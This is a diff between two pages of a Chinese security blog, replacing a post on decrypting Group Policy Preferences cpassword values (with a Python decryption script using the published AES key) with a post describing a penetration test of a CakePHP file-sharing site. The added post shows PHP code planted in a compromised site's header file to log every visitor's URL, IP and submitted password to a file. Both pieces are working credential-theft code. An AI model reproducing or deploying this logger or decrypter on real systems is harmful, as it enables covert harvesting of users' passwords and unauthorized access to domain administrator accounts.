@@ -35,28 +35,16 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="在利用域凭据过程中，除了通过Mimikatz和WCE从内存读取明文密码外，还可以通过域共享文件夹SYSVOL组策略文件获取哈希码。
-
-组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。
-
-这大大简化了系统管理工作。然而GPP有一个特殊的功能，它可以指定某个计算机的某个域账户为域中所有">
+<meta name="description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
 <meta property="og:type" content="article">
-<meta property="og:title" content="利用域凭据：解密GPP中的管理员密码">
-<meta property="og:url" content="http://www.rootat.net/2015/08/13/GPPcpassword/index.html">
+<meta property="og:title" content="PHP记录URL、表单内容.docx">
+<meta property="og:url" content="http://www.rootat.net/2015/07/16/PHPURLForm/index.html">
 <meta property="og:site_name" content="root@Zeroh">
-<meta property="og:description" content="在利用域凭据过程中，除了通过Mimikatz和WCE从内存读取明文密码外，还可以通过域共享文件夹SYSVOL组策略文件获取哈希码。
-
-组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。
-
-这大大简化了系统管理工作。然而GPP有一个特殊的功能，它可以指定某个计算机的某个域账户为域中所有">
-<meta property="og:updated_time" content="2016-03-09T06:57:11.886Z">
+<meta property="og:description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
+<meta property="og:updated_time" content="2016-03-09T07:56:30.529Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="利用域凭据：解密GPP中的管理员密码">
-<meta name="twitter:description" content="在利用域凭据过程中，除了通过Mimikatz和WCE从内存读取明文密码外，还可以通过域共享文件夹SYSVOL组策略文件获取哈希码。
-
-组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。
-
-这大大简化了系统管理工作。然而GPP有一个特殊的功能，它可以指定某个计算机的某个域账户为域中所有">
+<meta name="twitter:title" content="PHP记录URL、表单内容.docx">
+<meta name="twitter:description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -66,7 +54,7 @@
   };
 </script>
 
-  <title> 利用域凭据：解密GPP中的管理员密码 | root@Zeroh </title>
+  <title> PHP记录URL、表单内容.docx | root@Zeroh </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -157,7 +145,7 @@
           
           
             
-              利用域凭据：解密GPP中的管理员密码
+              PHP记录URL、表单内容.docx
             
           
         </h1>
@@ -166,8 +154,8 @@
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-08-13T14:53:10+08:00" content="2015-08-13">
-            2015-08-13
+          <time itemprop="dateCreated" datetime="2015-07-16T15:52:28+08:00" content="2015-07-16">
+            2015-07-16
           </time>
         </span>
 
@@ -177,8 +165,8 @@
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/08/13/GPPcpassword/#comments" itemprop="discussionUrl">
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/08/13/GPPcpassword/" itemprop="commentsCount"></span>
+            <a href="/2015/07/16/PHPURLForm/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/07/16/PHPURLForm/" itemprop="commentsCount"></span>
             </a>
           </span>
           
@@ -192,47 +180,19 @@
       
 
       
-        <span itemprop="articleBody"><p>在利用域凭据过程中，除了通过Mimikatz和WCE从内存读取明文密码外，还可以通过域共享文件夹SYSVOL组策略文件获取哈希码。</p>
-<blockquote>
-<p>组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。</p>
-</blockquote>
-<p>这大大简化了系统管理工作。然而GPP有一个特殊的功能，它可以指定某个计算机的某个域账户为域中所有的本地计算机管理账户。为什么有些人会使用这个功能呢？原因或许是他们就是想在所有计算机上指定某个新管理员，或许他们就是想在每台主机上更新本地账户的密码。一旦管理员使用了这个机制更新了GPO，那么所有的工作站将会拥有这个账户。在GPP的域环境下，这个账户的信息存储在域里，而且所有的AD用户都可以读取它。<br>通过GPP发布的账户信息全部存储在\[Domain Controller]\SYSVOL[Domain]\Policies中。其中的Groups.xml文件中就有cpassword的哈希值。有关字段的具体内容大致如下:</p>
-<pre><code><span class="tag">&lt;<span class="title">Properties</span> <span class="attribute">action</span>=<span class="value">”U”</span> <span class="attribute">userDSN</span>=<span class="value">”0”</span> <span class="attribute">dsn</span>=<span class="value">”test”</span> <span class="attribute">driver</span>=<span class="value">”SQL</span> <span class="attribute">Server</span>” <span class="attribute">description</span>=<span class="value">”test</span> <span class="attribute">data</span> <span class="attribute">source</span>”<span class="attribute">username</span>=<span class="value">”testusername”</span> <span class="attribute">cpassword</span>=<span class="value">”AzVJmXh</span>/<span class="attribute">J9KrU5n0czX1uBPLSUjzFE8j7OltPD8tLk</span>”/&gt;</span>
-</code></pre><p>Cpassword变量采取了AES的加密算法，微软已经公开了它的对称AES密钥。在加密密钥已知的情况下，我们就可以破解GPP中本地管理员账户的密码。Metasploit的POST模块以及支持这种破解功能。下面是python代码的实现：</p>
-<pre><code><span class="comment">#!/usr/bin/python</span>
-<span class="comment">#</span>
-<span class="comment"># Gpprefdecrypt - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.</span>
-<span class="comment">#</span>
-<span class="comment"># This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.</span>
-<span class="comment">#</span>
-
-<span class="keyword">import</span> sys
-<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES
-<span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode
-
-<span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):
-  <span class="keyword">print</span> <span class="string">"Usage: gpprefdecrypt.py &lt;cpassword&gt;"</span>
-  sys.exit(<span class="number">0</span>)
-
-<span class="comment"># Init the key</span>
-<span class="comment"># From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2</span>
-key = <span class="string">"""
-4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
-f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
-"""</span>.replace(<span class="string">" "</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>).decode(<span class="string">'hex'</span>)
-
-<span class="comment"># Add padding to the base64 string and decode it</span>
-cpassword = sys.argv[<span class="number">1</span>]
-cpassword += <span class="string">"="</span> * ((<span class="number">4</span> - len(sys.argv[<span class="number">1</span>]) % <span class="number">4</span>) % <span class="number">4</span>)
-password = b64decode(cpassword)
-
-<span class="comment"># Decrypt the password</span>
-o = AES.new(key, AES.MODE_CBC).decrypt(password)
-
-<span class="comment"># Print it</span>
-<span class="keyword">print</span> o[:-ord(o[-<span class="number">1</span>])].decode(<span class="string">'utf16'</span>)
-</code></pre><p>引用: <a href="http://pastebin.com/TE3fvhEh" target="_blank" rel="external">http://pastebin.com/TE3fvhEh</a></p>
-</span>
+        <span itemprop="articleBody"><p>某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。<br>通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此时有了URL和密码，就可以获得解密后的文件。</p>
+<pre><code>&lt;?php
+<span class="variable">$URL</span>[<span class="string">'URL'</span>] = <span class="string">"http://"</span>.$_SERVER[<span class="string">'SERVER_NAME'</span>].$_SERVER[<span class="string">'PHP_SELF'</span>].($_SERVER[<span class="string">'QUERY_STRING'</span>] ? <span class="string">"?"</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>] : <span class="string">""</span>); 
+<span class="variable">$ip</span>=$_SERVER[<span class="string">"REMOTE_ADDR"</span>];
+<span class="variable">$pass</span> = $_POST[<span class="string">"passname"</span>];
+<span class="variable">$fp</span> = fopen(<span class="string">'/var/www/log.txt'</span>, <span class="string">'a+b'</span>);
+fwrite(<span class="variable">$fp</span>, var_export(<span class="variable">$URL</span>[<span class="string">'URL'</span>], <span class="literal">true</span>));
+fwrite(<span class="variable">$fp</span>, <span class="variable">$pass</span>);
+fwrite(<span class="variable">$fp</span>, <span class="variable">$ip</span>);
+fwrite(<span class="variable">$fp</span>, <span class="string">"\n"</span>);
+fclose(<span class="variable">$fp</span>);
+?&gt;
+</code></pre></span>
       
     </div>
 
@@ -243,13 +203,13 @@ o = AES.new(key, AES.MODE_CBC).decrypt(password)
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/09/06/SSHReverseTunnel/" rel="prev">使用SSH反向隧道访问内网设备</a>
+              <a href="/2015/08/13/GPPcpassword/" rel="prev">利用域凭据：解密GPP中的管理员密码</a>
             
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/07/16/PHPURLForm/" rel="next">PHP记录URL、表单内容.docx</a>
+              <a href="/2015/05/17/Travel/" rel="next">旅行</a>
             
           </div>
         </div>
@@ -411,9 +371,9 @@ o = AES.new(key, AES.MODE_CBC).decrypt(password)
 
     <script type="text/javascript">
       var disqus_shortname = 'rootat';
-      var disqus_identifier = '2015/08/13/GPPcpassword/';
-      var disqus_title = '利用域凭据：解密GPP中的管理员密码';
-      var disqus_url = 'http://www.rootat.net/2015/08/13/GPPcpassword/';
+      var disqus_identifier = '2015/07/16/PHPURLForm/';
+      var disqus_title = 'PHP记录URL、表单内容.docx';
+      var disqus_url = 'http://www.rootat.net/2015/07/16/PHPURLForm/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
